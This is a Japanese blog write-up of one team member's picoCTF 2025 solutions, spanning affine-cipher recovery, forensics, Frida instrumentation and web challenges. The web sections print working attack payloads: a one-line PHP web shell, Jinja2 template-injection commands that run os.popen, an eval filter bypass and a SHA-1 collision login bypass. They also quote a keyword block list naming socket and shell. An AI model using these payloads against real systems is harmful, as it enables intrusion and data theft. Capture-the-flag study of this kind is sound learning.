---
title: picoCTF 2025 Writeup
date: 2025-03-18
layout: writeup
rank: 399
total_teams: 10460
team: CyberForge
language: ja
tags:
  - Web
  - Crypto
  - Rev
  - Forensics
  - General
---

# まえがき

ぼーっと携帯を眺めていたらハッカソンで出会った方からお誘いいただいたので、チームCyberForgeでpicoCTF 2025に参加してきました。開催期間がSecHack365の成果発表会や未踏ITの提案書執筆と重なっていたのであまり時間は取れませんでしたが、4610ptを獲得し10460チーム中399位、日本の学生チームに限定すると140チーム中19位でした。
個人としてはそのうち21問を解き、3425ptを獲得しました。この記事では自分が解いた問題のみの簡易Writeupを書いていきます。
![](/assets/img/picoctf_2025/5daeca6f9e9d-20250318.png)
![](/assets/img/picoctf_2025/def3bd9d3204-20250318.png)
![](/assets/img/picoctf_2025/3550a28196b4-20250318.png)

# Binary Exploitation

手を付けた頃にはもう解けそうな問題が残ってませんでした。

# Cryptography

## Guess My Cheese (Part 1) [200pt]

サーバーに接続して得られる暗号文から平文を復号する問題。
ヒントより、アフィン暗号が用いられていると推測。アフィン暗号は`E(x) = (ax+b) mod n`という式で原文を置換する。
この問題では全て大文字に統一されていることからA-Zを0-25と置き、n=26として考える。3回まで任意の操作ができるので、2回任意のチーズを暗号化して平文・暗号文の組を得る。これを用いて連立合同式を立てるとa,bが求められるので、与えられていた暗号文を復号し、3回目の操作で送信すれば良い。

```py
from pwn import *

def letter_to_num(letter):
    return ord(letter) - ord('A')

def num_to_letter(num):
    return chr(num + ord('A'))

def modinv(a, m):
    for i in range(m):
        if (a * i) % m == 1:
            return i
    return None

def decrypt(ciphertext, a_inv, b):
    plaintext = ""
    for c in ciphertext:
        if c.isalpha():
            num = letter_to_num(c)
            # 復号式： D(y) = a_inv * (y - b) mod 26
            plain_num = (a_inv * (num - b)) % 26
            plaintext += num_to_letter(plain_num)
        else:
            plaintext += c
    return plaintext


context.log_level = "debug"  
p = remote('verbal-sleep.picoctf.net', 49370)

p.recvuntil('you\'ll be able to guess it:  ')
cipher = p.recvline().strip().decode()
print('cipher:', cipher)

cheese1 = 'Abertam'
p.sendlineafter('What would you like to do?\n', 'e')
p.sendlineafter('What cheese would you like to encrypt?', cheese1)
p.recvuntil('Here\'s your encrypted cheese:  ')
enc_cheese1 = p.recvline().strip().decode()

cheese2 = 'Balaton'
p.sendlineafter('What would you like to do?\n', 'e')
p.sendlineafter('What cheese would you like to encrypt?', cheese2)
p.recvuntil('Here\'s your encrypted cheese:  ')
enc_cheese2 = p.recvline().strip().decode()

print('enc_cheese1:', enc_cheese1)
print('enc_cheese2:', enc_cheese2)

# ※ここでは、各平文の先頭文字を使ってパラメータを求める
x1 = letter_to_num(cheese1[0].upper())
y1 = letter_to_num(enc_cheese1[0])
x2 = letter_to_num(cheese2[0].upper())
y2 = letter_to_num(enc_cheese2[0])

# 連立合同式：
#   a*x1 + b ≡ y1 (mod 26)
#   a*x2 + b ≡ y2 (mod 26)
# より、 a*(x1 - x2) ≡ (y1 - y2) (mod 26) を得る
diff_x = (x1 - x2) % 26
diff_y = (y1 - y2) % 26

inv_diff_x = modinv(diff_x, 26)
if inv_diff_x is None:
    print("diff_xの逆元が見つかりません。")
    exit(1)

# パラメータ a, b を求める
a = (diff_y * inv_diff_x) % 26
b = (y1 - a * x1) % 26

print("Recovered parameters:")
print("a =", a)
print("b =", b)

# 復号のために、a の逆元を計算
a_inv = modinv(a, 26)
if a_inv is None:
    print("a の逆元が見つかりません。")
    exit(1)

answer = decrypt(cipher, a_inv, b).capitalize()
print("answer:", answer)

p.sendlineafter('What would you like to do?\n', 'g')
p.sendlineafter('So...what\'s my cheese?\n', answer)

p.recvuntil('Here\'s the password to the cloning room:  ')
flag = p.recvline().strip().decode()
print("flag", flag)
```

`picoCTF{ChEeSy1bdf6eaa}`

# Forensics

## Ph4nt0m 1ntrud3r [50pt]

TCP通信のpcapファイルが与えられる。分割してbase64encodeしたflagがパケットのTCP payloadになっているので、頑張って取り出して復号する。

`picoCTF{1t_w4snt_th4t_34sy_tbh_4r_e5e8c78d}`

## RED [50pt]

真っ赤な画像が与えられる。[うさみみハリケーン](https://digitaltravesia.jp/usamimihurricane/webhelp/_RESOURCE/MenuItem/another/anotherAboutSteganography.html)というツールでRGBAのLSBを見ると`cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==`というbase64っぽい文字列が得られるので、復号する。

`picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}`

## Bitlocker-1 [200pt]

暗号化したBitLockerイメージが与えられる。
[BitCracker](https://github.com/e-ago/bitcracker)でhashを抽出し、[John the Ripper](https://github.com/openwall/john)でぶん回すとパスワード`jacqueline`が得られた。GPUがよわよわなLAPTOPのCPUだけでもいけた。あとはマウントして中に入ると`flag.txt`が見つかったのでそれを読むだけ。

`picoCTF{us3_b3tt3r_p4ssw0rd5_pl5!_3242adb1}`

## Event-Viewing [200pt]

Windowsのイベントログファイルが与えられる。この中に3つに分割されたフラグがあるらしい。
まず、シャットダウン（Event ID 1074）のイベントを見ると謎のパラメータに謎の文字列`dDAwbF84MWJhM2ZlOX0=`があった。これをbase64decodeするとflagの断片らしき文字列になった。
残りの2つはイベントを探しても見つけられなかったので、base64っぽい文字列を抽出するコマンドを実行して探索した。

```shell
> Get-WinEvent -Path ".\Windows_Logs.evtx" | ForEach-Object {
  $matches = [regex]::Matches($_.Message, '[A-Za-z0-9+/]{20,}={1,2}')
  foreach ($match in $matches) {
  Write-Output $match.Value
 }
}
```

するとそれっぽい文字列`MXNfYV9wcjN0dHlfdXMzZnVsXw==`と`cGljb0NURntFdjNudF92aTN3djNyXw==`が得られたので、それぞれbase64decodeして3つを繋ぎ合わせる。

`picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_81ba3fe9}`

# General Skills

## Rust fixme 1 [100pt]

ボーナス問題その1。配布されたRustコードのコンパイルエラーを修正するだけ。

`picoCTF{4r3_y0u_4_ru$t4c30n_n0w?}`

## Rust fixme 2 [100pt]

ボーナス問題その2。配布されたRustコードのコンパイルエラーを修正するだけ。

`picoCTF{4r3_y0u_h4v1n5_fun_y31?}`

## Rust fixme 3 [100pt]

ボーナス問題その3。配布されたRustコードのコンパイルエラーを修正するだけ。

`picoCTF{n0w_y0uv3_f1x3d_1h3m_411}`

# Reverse Engineering

## Flag Hunters [75pt]

歌詞が順に表示されるサーバーが与えられるが、flagは表示のスタート地点よりもさらに前にあり、これをなんとかして読み出したい。途中で命令を設定することができる箇所がある。
命令は`;`で区切られるので、`;RETURN 0`を入力すると次のループで1行目にジャンプし、flagを含むsecret_introが表示される。

`picoCTF{70637h3r_f0r3v3r_ac197d12}`

## Binary Instrumentation 1 [200pt]

Windowsの実行ファイルが与えられる。
ヒントに従ってFridaをインストールする。実行ファイルを起動するとSleep関数で動作を止めているような挙動を見せたので、FridaスクリプトでSleep関数を何も処理しないようにオーバーライドする。

```js
var kernel32_sleep = Module.getExportByName("kernel32.dll", "Sleep");
Interceptor.replace(kernel32_sleep, new NativeCallback(function(ms) {
    return;
}, 'void', ['uint32']));
```

```shell
> frida -f .\bininst1\bininst1.exe -l override_sleep.js
```

これでSleepを無効化して実行すると`Ok, I'm Up! The flag is: cGljb0NURnt3NGtlX20zX3VwX3cxdGhfZnIxZGFfZjI3YWNjMzh9`というテキストが表示されたので、base64decodeする。

`picoCTF{w4ke_m3_up_w1th_fr1da_f27acc38}`

## Chronohack [200pt]

トークンを入力するとflagを表示するシンプルなサーバーが与えられる。
サーバーはサーバー起動時の時刻（ミリ秒単位）をseedにしてトークンを生成している。サーバーに接続した大体の時刻はローカルでも分かるので、総当たりする。50回しか試行できないが、再接続して順に試していけば良い。

```py
from pwn import *
import random
import time

context.log_level = 'debug' # debugモードのログにflagが流れてくる

def get_random(length, seed):
    alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    random.seed(seed)
    s = ""
    for i in range(length):
        s += random.choice(alphabet)
    return s

for offset in range(0, 20):
    print(f"補正値 {offset} で試行中...")

    p = remote('verbal-sleep.picoctf.net', 61421)
    p.recvuntil(b'Enter your guess for the token (or exit):')
    now = int(time.time() * 1000)
    
    for i in range(45):
        print(offset*40 + i)
        token = get_random(20, now - offset*40 - i)
        p.sendline(token.encode())
        recv = p.recvuntil(b'Enter your guess for the token (or exit):')
    p.close()
```

`picoCTF{UseSecure#$_Random@j3n3r@T0rs8a8d9ae0}`

## perplexed [400pt]

逆コンパイルして処理を読む典型的なRev問。Ghidraで逆コンパイルした結果をChatGPTに投げたらソルバができてしまった。

```c
undefined8 check(char *param_1)

{
  size_t sVar1;
  undefined8 uVar2;
  size_t sVar3;
  char local_58 [36];
  uint local_34;
  uint local_30;
  undefined4 local_2c;
  int local_28;
  uint local_24;
  int local_20;
  int local_1c;
  
  sVar1 = strlen(param_1);
  if (sVar1 == 0x1b) {
    local_58[0] = -0x1f;
    local_58[1] = -0x59;
    local_58[2] = '\x1e';
    local_58[3] = -8;
    local_58[4] = 'u';
    local_58[5] = '#';
    local_58[6] = '{';
    local_58[7] = 'a';
    local_58[8] = -0x47;
    local_58[9] = -99;
    local_58[10] = -4;
    local_58[0xb] = 'Z';
    local_58[0xc] = '[';
    local_58[0xd] = -0x21;
    local_58[0xe] = 'i';
    local_58[0xf] = 0xd2;
    local_58[0x10] = -2;
    local_58[0x11] = '\x1b';
    local_58[0x12] = -0x13;
    local_58[0x13] = -0xc;
    local_58[0x14] = -0x13;
    local_58[0x15] = 'g';
    local_58[0x16] = -0xc;
    local_1c = 0;
    local_20 = 0;
    local_2c = 0;
    for (local_24 = 0; local_24 < 0x17; local_24 = local_24 + 1) {
      for (local_28 = 0; local_28 < 8; local_28 = local_28 + 1) {
        if (local_20 == 0) {
          local_20 = 1;
        }
        local_30 = 1 << (7U - (char)local_28 & 0x1f);
        local_34 = 1 << (7U - (char)local_20 & 0x1f);
        if (0 < (int)((int)param_1[local_1c] & local_34) !=
            0 < (int)((int)local_58[(int)local_24] & local_30)) {
          return 1;
        }
        local_20 = local_20 + 1;
        if (local_20 == 8) {
          local_20 = 0;
          local_1c = local_1c + 1;
        }
        sVar3 = (size_t)local_1c;
        sVar1 = strlen(param_1);
        if (sVar3 == sVar1) {
          return 0;
        }
      }
    }
    uVar2 = 0;
  }
  else {
    uVar2 = 1;
  }
  return uVar2;
}
```

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# チェック関数内で使われる正解バイト列（local_58の内容）
# 負の値は2の補数表現により変換（例: -0x1f -> 0xE1 ）
target = [
    0xE1, 0xA7, 0x1E, 0xF8, 0x75, 0x23, 0x7B, 0x61,
    0xB9, 0x9D, 0xFC, 0x5A, 0x5B, 0xDF, 0x69, 0xD2,
    0xFE, 0x1B, 0xED, 0xF4, 0xED, 0x67, 0xF4
]

# 入力は27バイト。チェック関数では下位184ビットが使用される（184 = 23*8）。
# 27バイト分の下位7ビットから、実際に使用されるのは26バイト＋2ビット分（26*7+2 = 184）。
# ここでは、全体27バイトのリストを用意しておく（各バイトは下位7ビットのみ意味を持つ）
inp = [0] * 27

# シミュレーションのカウンタ
# i: 現在処理中のinpのバイトインデックス
# r: 現在のバイト内での「位置」（check内のlocal_20相当）
i = 0
r = 0  # 0になったら「初期状態」として、すぐに1にセットされる

# 全体で比較するビット数は target の 23バイト×8ビット = 184ビット
total_bits = 23 * 8
bit_counter = 0

# target の各バイトについて、8ビットずつ順に比較していく
for t_index in range(len(target)):  # t_index: 0～22
    for k in range(8):
        # check関数内では、毎回最初に local_20 が0なら1にする
        if r == 0:
            r = 1
        # 現在、inp[i] のどのビットを使うかは (7 - r) 番目（0〜6の範囲）
        bitpos_inp = 7 - r
        # 対応するtargetバイトのビットは、(7 - k) 番目
        desired_bit = (target[t_index] >> (7 - k)) & 1

        # inp[i] の該当ビットを desired_bit にセットする
        if desired_bit == 1:
            inp[i] |= (1 << bitpos_inp)
        # 既に 0 ならそのままで（初期化済み）

        # 次のビットへ
        r += 1
        # 1バイト分（下位7ビット）は rが8になったときに次のバイトへ進む
        if r == 8:
            r = 0
            i += 1
        bit_counter += 1
        if bit_counter >= total_bits:
            break
    if bit_counter >= total_bits:
        break

# ※ 上記で、inp[0]～inp[i-1]（完全に決定済み）と、inp[i] の上位2ビット分が決まっています。
# 残りの未使用ビットは任意ですが、ここでは0のままとしています。

# 結果のflag（文字列）を生成
flag = ''.join(chr(b) for b in inp)
print("Recovered flag:", flag)
```

`picoCTF{0n3_bi7_4t_a_7im3}`

# Web Exploitation

## Cookie Monster Secret Recipe [50pt]

ログインフォームっぽいサイト。
username=user, password=passwordでログインできた。Cookieをbase64decodeするとflagが得られる。

`picoCTF{c00k1e_m0nster_l0ves_c00kies_98D0603F}`

## head-dump [50pt]

ニュースサイトのような何か。API Docsを参照すると`/heapdump`というエンドポイントが見つかる。アクセスすると拡張子が`.heapsnapshot`のファイルが得られ、その中にflagがある。

`picoCTF{Pat!3nt_15_Th3_K3y_305d5b9a}`

## n0s4n1ty 1 [100pt]

任意のファイルがアップロード可能なサイト。

```php
<?php system($_GET['cmd']); ?>
```

というphpファイルをアップロードしてRCEする。クエリパラメータを`?cmd=sudo%20cat%20/root/flag.txt`にしてアクセスするとflagが得られる。

`picoCTF{wh47_c4n_u_d0_wPHP_d698d800}`

## SSTI1 [100pt]

おそらく入力文字列をそのまま表示するサイト。SSTIが可能。
`{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`でRCEできた。flagファイルがあったのでそれをcatするだけ。

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}`

## WebSockFish [200pt]

チェスで勝ったらフラグがもらえそうなサイト。WebSocketのメッセージを見てると盤面の評価値らしき値を送信している。超でかい負の数を送信するとフラグがもらえた。

```js
// WebSocket の接続先 URL を指定
const socket = new WebSocket('ws://verbal-sleep.picoctf.net:60291/ws/');

// 接続が確立したときの処理
socket.addEventListener('open', (event) => {
  const message = 'eval -100000';
  console.log('送信:', message);
  socket.send(message);
});

// サーバーからメッセージを受信したときの処理
socket.addEventListener('message', (event) => {
  console.log('受信:', event.data);
});
```

`picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_dc1dbff7}`

## 3v@l [200pt]

以下のfilterをbypassしてRCEしたい。

```
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```

`getattr(__builtins__, 'eva' + 'l')`でevalできた。文字種制限をbypassして`open('/flag.txt').read()`という文字列を構築できれば勝ち。ここでは`chr()`を使う。
最終的なpayloadはこうなった。

```py
getattr(__builtins__, 'eva' + 'l')("".join([chr(c) for c in [111, 112, 101, 110, 40, 34, 47, 102, 108, 97, 103, 46, 116, 120, 116, 34, 41, 46, 114, 101, 97, 100, 40, 41]]))
```

`picoCTF{D0nt_Use_Unsecure_f@nctions0cd8a9f1}`

## SSTI2 [200pt]

おそらく入力文字列をそのまま表示するサイト。ただしSSTI1と違って一部の文字が弾かれてしまう。
フィルタの詳しい中身は結局分からなかったがこのpayloadでいけた。
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`

参考: <https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>

`picoCTF{sst1_f1lt3r_byp4ss_ece726e9}`

## Apriti sesamo [300pt]

ログインフォームっぽいサイト。emacsのバックアップファイル`impossibleLogin.php~`にアクセスするとPHPのソースコードが見える。

```php
<?php if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}?>
```

難読化を直すとこうなる。

```php
<?php
if (isset($_POST["username"]) && isset($_POST["pwd"])) {
    $username = $_POST["username"];
    $pwd      = $_POST["pwd"];
    
    if ($username == $pwd) {
        echo base64_decode("PGJyLz5GYWlsZWQhIE5vIGZsYWcgZm9yIHlv4Q==");
    } else {
        if (sha1($username) === sha1($pwd)) {
            echo file_get_contents(base64_decode("Li4vZmxhZy50eHQ="));
        } else {
            echo base64_decode("PGJyLz5GYWlsZWQhIE5vIGZsYWcgZm9yIHlv4Q==");
        }
    }
}
?>
```

要するにSHA1の衝突を起こせばいい。[衝突する2つのpdfファイルが公開されていた](https://shattered.io/)ので、これを良い感じにエンコードしてリクエストを送る。

```shell
#!/bin/bash

(
  # "username=" の部分を先に出力
  echo -n "username="

  # shattered-1.pdf を URLエンコード
  xxd -p < shattered-1.pdf \
    | tr -d '\n' \
    | sed 's/\(..\)/%\1/g'

  # "&pwd=" の区切り文字を続けて出力
  echo -n "&pwd="

  # shattered-2.pdf を URLエンコード
  xxd -p < shattered-2.pdf \
    | tr -d '\n' \
    | sed 's/\(..\)/%\1/g'

) | curl 'http://verbal-sleep.picoctf.net:58281/impossibleLogin.php' \
         -H 'Content-Type: application/x-www-form-urlencoded' \
         --data-binary @-
```

`picoCTF{w3Ll_d3sErV3d_Ch4mp_5292ca30}`

## Pachinko [300pt]

NANDシミュレータのサイト。何も分かってないけどなんか適当に繋げてたら解けた。
![](/assets/img/picoctf_2025/829c4687ddb0-20250318.png)

`picoCTF{p4ch1nk0_f146_0n3_e947b9d7}`

# あとがき

Forensicsがちょっとできるようになりましたが、相変わらずPwnとCryptoが弱点ですね。Webのボス問が解けなかったのも悔しいです。今回改めて感じましたが、（実質）一人で解いていると行き詰まった時に沼りがちなので、不定期で僕と一緒にゆるくCTFに参加してくれる方・チームを探しています。Webは多少できます。よろしくお願いします。
